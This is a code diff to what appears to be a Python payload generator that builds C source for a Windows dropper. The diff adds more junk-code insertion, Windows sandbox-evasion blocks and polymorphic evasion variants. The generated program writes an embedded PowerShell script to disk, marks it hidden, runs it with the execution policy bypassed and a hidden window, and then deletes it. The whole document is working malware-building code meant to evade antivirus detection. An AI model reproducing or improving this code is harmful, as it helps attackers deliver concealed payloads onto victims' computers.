@@ -41,22 +41,25 @@ Randfileptr = usefull.varname_creator()
 
 Randattr = usefull.varname_creator()
 
-Junkcode1 = usefull.Junkmathinject(str(random.randint(1,12)))	        # Junkcode
-Junkcode2 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode3 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode4 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode5 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode6 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode7 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
+Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
+Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
 
-Win_eva1 = usefull.windows_evasion(str(random.randint(1,4)))
-Win_eva2 = usefull.windows_evasion(str(random.randint(1,4)))
-Win_eva3 = usefull.windows_evasion(str(random.randint(1,4)))
+Win_eva1 = usefull.windows_evasion(str(random.randint(1,5)))
+Win_eva2 = usefull.windows_evasion(str(random.randint(1,5)))
+Win_eva3 = usefull.windows_evasion(str(random.randint(1,5)))
+Win_eva4 = usefull.windows_evasion(str(random.randint(1,5)))
 
 
-MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
-MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
-MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
+MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
  
 Hollow_code = ""
 Hollow_code += "#include <windows.h>\n"
@@ -68,10 +71,12 @@ Hollow_code += Junkcode1
 Hollow_code += Win_eva1
 Hollow_code += Win_eva2
 Hollow_code += Win_eva3
+Hollow_code += Win_eva4
 Hollow_code += Junkcode2
 Hollow_code += MorphEvasion1
 Hollow_code += MorphEvasion2
 Hollow_code += MorphEvasion3
+Hollow_code += Junkcode3
 Hollow_code += "char " + Randpshvarname + "[] = " + Powershell_Script 
 Hollow_code += "char " + Randcmdvarname + "[] = \"powershell -executionpolicy bypass -WindowStyle Hidden -Noexit -File " + Randscriptname +  "\";\n"
 Hollow_code += "FILE *" + Randfileptr + " = fopen(\"" + Randscriptname + "\",\"w\");\n"
@@ -79,13 +84,14 @@ Hollow_code += "fputs(" + Randpshvarname + "," + Randfileptr + ");\n"
 Hollow_code += "fclose(" + Randfileptr + ");\n"
 Hollow_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randscriptname + "\");\n"
 Hollow_code += "SetFileAttributes(\"" + Randscriptname + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
+Hollow_code += Junkcode4
+Hollow_code += Junkcode5
 Hollow_code += "system(" + Randcmdvarname + ");\n"
-Hollow_code += Junkcode3
 Hollow_code += "remove(\"" + Randscriptname + "\");\n"
-Hollow_code += "}else{" + Junkcode1 + "}\n"
-Hollow_code += "}else{" + Junkcode2 + "}\n"
-Hollow_code += "}else{" + Junkcode3 + "}\n"
-Hollow_code += "}" + Junkcode4 + "}}\n" 
+Hollow_code += "}else{" + Junkcode6 + "}\n"
+Hollow_code += "}else{" + Junkcode7 + "}\n"
+Hollow_code += "}else{" + Junkcode8 + "}\n"
+Hollow_code += "}}"  + Junkcode9 + "}}\n" 
 Hollow_code += "return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
